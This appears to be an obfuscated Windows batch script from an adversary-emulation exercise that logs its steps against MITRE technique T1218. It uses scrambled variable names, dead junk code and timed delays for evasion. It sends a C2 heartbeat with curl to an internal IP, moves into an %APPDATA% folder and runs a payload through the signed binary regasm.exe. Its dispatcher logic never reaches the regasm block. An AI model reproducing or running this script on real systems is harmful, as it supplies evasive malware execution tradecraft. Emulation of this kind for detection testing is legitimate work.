@echo off
SETLOCAL ENABLEDELAYEDEXPANSION
SET txisnba=%APPDATA%\8653\09495a62
SET mdvfmsbx=https://10.0.0.49
SET keghkgto=https://10.0.0.49/stage/2/icon.png?8653-7
SET jwcnifl=ITZEL-S2BO
SET rrocubc=7
SET xzanpex=msedges.txt
SET dvhhyc=8653
SET zxmqp=!rrocubc!\macula-simulations.log
SET mqbcde=0
SET lkjhgf=C:\Windows\Microsoft.NET\Framework\v4.0.30319\regasm.exe
SET xcvdrt=42

timeout /t 45 /nobreak >nul
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: delay_initial=complete>> "!zxmqp!" 2>nul
GOTO kjfdhr

:dead_xcvb
REM Unreachable junk
SET fake=never_reached
GOTO END

:kjfdhr
curl -k -s -o nul "!keghkgto!"
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: heartbeat_c2=complete>> "!zxmqp!" 2>nul
SET mqbcde=17
GOTO lpmkqw

:junk_bnhyu
REM Dead code block
EXIT /B 1

:lpmkqw
IF !mqbcde!==17 GOTO zxcvbn
IF !mqbcde!==42 GOTO qweras
IF !mqbcde!==99 GOTO END

:zxcvbn
ping -n 12 127.0.0.1 >nul
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: delay_mid1=complete>> "!zxmqp!" 2>nul
SET mqbcde=42
GOTO lpmkqw

:dead_tyuio
SET junk=dead_value
GOTO END

:qweras
cd /d "!txisnba!"
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: chdir_target=!cd!>> "!zxmqp!" 2>nul
SET mqbcde=99
GOTO lpmkqw

:mnbvcd
REM Dead path
GOTO END

:plokij
SET /A delay=%RANDOM% %% 20 + 10
timeout /t !delay! /nobreak >nul
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: delay_random=!delay!s>> "!zxmqp!" 2>nul
GOTO qweras

:zxcvbq
IF 1==1 (GOTO plokij) ELSE (GOTO dead_xcvb)

:qwerty
"!lkjhgf!" /U "!xzanpex!"
SET ttp_result=1
SET ttp_err=
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: regasm_execute=started>> "!zxmqp!" 2>nul
IF NOT ERRORLEVEL 1 (
    echo [!DATE! !TIME!][!jwcnifl!]: !rrocubc!-!dvhhyc!-T1218|Signed Binary Proxy Execution=!ttp_result!:!ttp_err!>> "!zxmqp!" 2>nul
) ELSE (
    SET ttp_result=0
    SET ttp_err=assembly_load_failed
    echo [!DATE! !TIME!][!jwcnifl!]: !rrocubc!-!dvhhyc!-T1218|Signed Binary Proxy Execution=!ttp_result!:!ttp_err!>> "!zxmqp!" 2>nul
)
GOTO END

:lkjhgf
REM Final execution block reached from dispatcher
IF !mqbcde!==99 GOTO qwerty
CHOICE /C Y /N /D Y /T 8 >nul
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: delay_final=complete>> "!zxmqp!" 2>nul
GOTO END

:END
ENDLOCAL